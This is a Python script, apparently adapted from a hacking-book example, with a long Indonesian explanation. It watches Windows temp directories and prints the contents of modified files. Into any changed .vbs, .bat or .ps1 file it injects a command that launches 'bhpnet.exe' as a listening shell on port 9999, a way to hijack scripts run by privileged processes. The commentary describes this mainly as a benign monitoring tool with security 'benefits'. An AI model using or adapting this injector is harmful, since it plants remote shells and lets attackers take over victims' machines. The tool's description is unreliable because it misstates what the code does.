# Modified example that is originally given here:
# http://timgolden.me.uk/python/win32_how_do_i/watch_directory_for_changes.html
import tempfile
import threading
import win32file
import win32con
import os

# these are the common temp file directories
dirs_to_monitor = ["C:\\WINDOWS\\Temp", tempfile.gettempdir()]

# file modification constants
FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

# extension based code snippets to inject
file_types = {}
command = "C:\\WINDOWS\\TEMP\\bhpnet.exe –l –p 9999 –c"
file_types['.vbs'] = ["\r\n'bhpmarker\r\n",
                      "\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n"
                      % command]
file_types['.bat'] = ["\r\nREM bhpmarker\r\n", "\r\n%s\r\n" % command]
file_types['.ps1'] = ["\r\n#bhpmarker", "Start-Process \"%s\"" % command]


def inject_code(full_filename, extension, contents):
    # is our marker already in the file?
    if file_types[extension][0] in contents:
        return

    # no marker let's inject the marker and code
    full_contents = file_types[extension][0]
    full_contents += file_types[extension][1]
    full_contents += contents

    fd = open(full_filename, "wb")
    fd.write(full_contents.encode())
    fd.close()

    print("[\o/] Injected code.")

    return


def start_monitor(path_to_watch):
    # we create a thread for each monitoring run
    file_list_directory = 0x0001

    h_directory = win32file.CreateFile(
        path_to_watch,
        file_list_directory,
        win32con.FILE_SHARE_READ
        | win32con.FILE_SHARE_WRITE
        | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None)

    while 1:
        try:
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_SIZE |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY,
                None,
                None
            )

            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)

                if action == FILE_CREATED:
                    print("[ + ] Created %s" % full_filename)
                elif action == FILE_DELETED:
                    print("[ - ] Deleted %s" % full_filename)
                elif action == FILE_MODIFIED:
                    print("[ * ] Modified %s" % full_filename)

                    # dump out the file contents
                    print("[vvv] Dumping contents...")

                    try:
                        fd = open(full_filename, "rb")
                        contents = fd.read()
                        fd.close()
                        print(contents)
                        print("[^^^] Dump complete.")
                        filename, extension = os.path.splitext(full_filename)
                        if extension in file_types:
                            inject_code(full_filename, extension, contents)
                    except:
                        print("[!!!] Failed.")

                elif action == FILE_RENAMED_FROM:
                    print("[ > ] Renamed from: %s" % full_filename)
                elif action == FILE_RENAMED_TO:
                    print("[ < ] Renamed to: %s" % full_filename)
                else:
                    print("[???] Unknown: %s" % full_filename)
        except:
            pass


for path in dirs_to_monitor:
    monitor_thread = threading.Thread(target=start_monitor, args=(path,))
    print("Spawning monitoring thread for path: %s" % path)
    monitor_thread.start()


# ===================================================================================== # 
# Program ini bertujuan untuk memantau perubahan pada file-file di beberapa direktori tertentu, dan ketika ada perubahan, program akan bereaksi sesuai dengan jenis perubahan yang terjadi. Berikut adalah penjelasan alur programnya:

# Impor Modul:
# Program mengimpor modul-modul yang diperlukan seperti tempfile, threading, win32file, win32con, dan os untuk melakukan operasi pada sistem file Windows.

# Variabel dirs_to_monitor:
# Variabel ini berisi daftar direktori yang akan dimonitor. Direktori yang dimonitor adalah direktori tempat file sementara Windows (C:\\WINDOWS\\Temp) dan direktori tempat file sementara pengguna saat ini (tempfile.gettempdir()).

# Konstanta Perubahan File:
# Program mendefinisikan konstanta untuk jenis perubahan file, seperti file dibuat, dihapus, diubah, direname dari, dan direname menjadi.

# file_types:
# Variabel ini adalah kamus (dictionary) yang berisi jenis-jenis file (berdasarkan ekstensi) dan potongan kode yang akan disuntikkan ke dalamnya.

# Fungsi inject_code:
# Fungsi ini bertugas untuk menyuntikkan potongan kode ke dalam file.
# Jika potongan kode sudah ada dalam file, maka fungsi ini tidak akan melakukan apa-apa.
# Jika potongan kode belum ada, maka fungsi ini akan menyuntikkan potongan kode ke dalam file.

# Fungsi start_monitor:
# Fungsi ini akan memulai proses pemantauan perubahan file di direktori yang diberikan.
# Program menggunakan win32file.CreateFile untuk membuat koneksi ke direktori yang akan dimonitor.
# Kemudian, program terus membaca perubahan yang terjadi di direktori menggunakan win32file.ReadDirectoryChangesW.
# Ketika terjadi perubahan, program akan mengekstrak informasi tentang tindakan perubahan dan nama file yang terlibat.
# Berdasarkan tindakan perubahan, program akan mencetak pesan yang sesuai dan, jika perlu, akan memanggil fungsi inject_code untuk menyuntikkan kode ke dalam file yang telah diubah.

# Iterasi dan Pemantauan:

# Program akan melakukan iterasi pada setiap direktori yang ada dalam dirs_to_monitor dan akan memulai sebuah thread pemantauan untuk setiap direktori.
# Thread-thread ini akan terus berjalan secara paralel, memantau perubahan file di direktori yang sesuai.
# Dengan cara ini, program dapat digunakan untuk secara aktif memantau perubahan file dalam beberapa direktori tertentu dan meresponsnya sesuai dengan kebutuhan, misalnya dengan menyuntikkan kode tambahan ke dalam file yang diubah.


# ================================================================================================================================================================================================================================================== # 
    
#### Fungsi:

# 1. **Memantau Perubahan File:**
#    - Program ini berfungsi untuk secara aktif memantau perubahan yang terjadi pada file-file dalam beberapa direktori yang ditentukan.

# 2. **Respon Terhadap Perubahan File:**
#    - Ketika ada perubahan pada file, program akan merespons sesuai dengan jenis perubahan yang terjadi, seperti mencetak pesan untuk memberi tahu pengguna bahwa file telah dibuat, dihapus, diubah, atau direname.

# 3. **Menyuntikkan Kode Tambahan:**
#    - Program juga memiliki kemampuan untuk menyuntikkan potongan kode tambahan ke dalam file-file yang terpengaruh, seperti script VBScript, batch, atau PowerShell, sesuai dengan ekstensi file yang diubah.

### Manfaat:

# 1. **Pemantauan Aktif:**
#    - Program ini memberikan kemampuan untuk memantau secara aktif perubahan file dalam direktori-direktori yang dipilih, sehingga pengguna dapat segera mengetahui perubahan yang terjadi pada file-file tersebut.

# 2. **Deteksi Perubahan Tidak Diinginkan:**
#    - Dengan memantau perubahan file secara terus-menerus, program ini dapat membantu pengguna dalam mendeteksi adanya perubahan file yang tidak diinginkan atau potensial ancaman keamanan.

# 3. **Automatisasi Tindakan Respon:**
#    - Program dapat memberikan respon otomatis terhadap perubahan file tertentu dengan menyuntikkan kode tambahan ke dalamnya. Ini dapat digunakan untuk mengaktifkan atau menjalankan tindakan tertentu sesuai dengan kebutuhan, seperti menjalankan perintah atau skrip tambahan.

### Cara Penggunaan:

# 1. **Konfigurasi Direktori yang Dimonitor:**
#    - Pengguna perlu menentukan direktori atau direktori tempat program ini akan memantau perubahan file. Hal ini dapat dilakukan dengan mengubah nilai variabel `dirs_to_monitor`.

# 2. **Menjalankan Program:**
#    - Pengguna dapat menjalankan program dengan menjalankan skrip Python yang telah disediakan. Pastikan bahwa semua modul yang diperlukan telah terinstal dan sistem operasi yang digunakan adalah Windows.

# 3. **Memantau Perubahan:**
#    - Setelah program dijalankan, ia akan secara otomatis memantau perubahan yang terjadi pada file-file dalam direktori yang telah ditentukan.

# 4. **Respon Manual atau Otomatis:**
#    - Ketika ada perubahan file, pengguna dapat menanggapi perubahan tersebut secara manual dengan melihat pesan yang dicetak oleh program.
#    - Pengguna juga dapat mengonfigurasi respon otomatis terhadap perubahan file tertentu dengan menambahkan potongan kode ke dalam variabel `file_types` sesuai dengan ekstensi file yang ingin dimonitor.

### Pengembangan:

# 1. **Peningkatan Fungsionalitas:**
#    - Program ini dapat dikembangkan dengan menambahkan fungsionalitas tambahan, seperti kemampuan untuk mengirim notifikasi atau melaporkan perubahan file secara langsung ke pengguna.

# 2. **Pengoptimalan Kinerja:**
#    - Perlu dipertimbangkan untuk mengoptimalkan kinerja program, terutama jika program harus memantau banyak file dalam waktu yang singkat.

# 3. **Keamanan:**
#    - Dalam pengembangan selanjutnya, perlu diperhatikan aspek keamanan untuk memastikan bahwa program ini tidak digunakan untuk tujuan jahat, seperti menyuntikkan kode berbahaya ke dalam file-file yang ada.

# 4. **Dokumentasi dan Pelatihan:**
#    - Penting untuk menyertakan dokumentasi yang baik dan memberikan pelatihan kepada pengguna tentang cara menggunakan program ini dengan benar dan etis.

# Dengan memperhatikan aspek-aspek tersebut, program ini dapat dikembangkan lebih lanjut untuk meningkatkan fungsionalitasnya, keamanannya, dan juga membantu pengguna dalam memantau dan merespons perubahan file dengan lebih efisien.
